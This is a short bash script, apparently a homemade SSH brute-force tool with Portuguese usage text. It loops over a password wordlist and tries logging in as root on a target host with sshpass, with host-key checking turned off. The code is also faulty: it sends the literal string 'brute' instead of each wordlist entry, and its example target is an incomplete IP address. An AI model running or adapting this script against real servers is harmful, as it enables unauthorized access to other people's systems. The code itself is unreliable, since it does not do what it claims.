#!/bin/bash

if [ "$1" == "" ]
then
	echo "################################"
	echo "###### SSH BRUTEFORCE ##########"
	echo "################################"
	echo "######## Developed by: N0KK ####"
	echo "################################"
	echo "Modo de uso: $0 <ALVO>"
	echo "Exemplo: $0 192.168.0"

else
	echo "################################"
	echo "###### SSH BRUTEFORCE ##########"
	echo "################################"
	echo "######## Developed by: N0KK ####"
	echo "################################"

for brute in $(cat wordlist.txt)
do
	sshpass -p 'brute' ssh -o StrictHostKeyChecking=no root@$1
done
fi
